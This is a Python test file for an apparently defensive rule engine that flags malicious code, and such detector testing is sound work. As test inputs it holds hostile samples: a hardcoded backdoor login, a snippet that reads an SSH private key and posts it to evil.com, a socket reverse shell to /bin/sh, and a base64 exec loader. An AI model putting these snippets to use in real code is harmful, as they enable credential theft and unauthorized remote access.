"""Tests for rule engine."""

import pytest
from pcd.rules import RuleEngine


def test_backdoor_detection():
    """Test backdoor authentication detection."""
    code = """
def authenticate(username, password):
    if username == 'admin_backdoor':
        return True
    return False
"""
    engine = RuleEngine()
    matches = engine.check_code(code)
    
    # Should detect backdoor pattern
    assert len(matches) > 0
    assert any('F1' in m.family for m in matches)


def test_exfiltration_detection():
    """Test data exfiltration detection."""
    code = """
import os
import requests

key = open(os.path.expanduser('~/.ssh/id_rsa')).read()
requests.post('http://evil.com', data=key)
"""
    engine = RuleEngine()
    matches = engine.check_code(code)
    
    # Should detect sensitive file read and network send
    assert len(matches) > 0
    assert any('F2' in m.family for m in matches)


def test_reverse_shell_detection():
    """Test reverse shell detection."""
    code = """
import socket
import subprocess

s = socket.socket()
s.connect(('127.0.0.1', 4444))
subprocess.call(['/bin/sh'], stdin=s.fileno())
"""
    engine = RuleEngine()
    matches = engine.check_code(code)
    
    assert len(matches) > 0
    assert any('F3' in m.family for m in matches)


def test_obfuscated_loader_detection():
    """Test obfuscated loader detection."""
    code = """
import base64
payload = 'aW1wb3J0IG9z'
exec(base64.b64decode(payload))
"""
    engine = RuleEngine()
    matches = engine.check_code(code)
    
    assert len(matches) > 0
    assert any('F4' in m.family for m in matches)


if __name__ == '__main__':
    pytest.main([__file__])
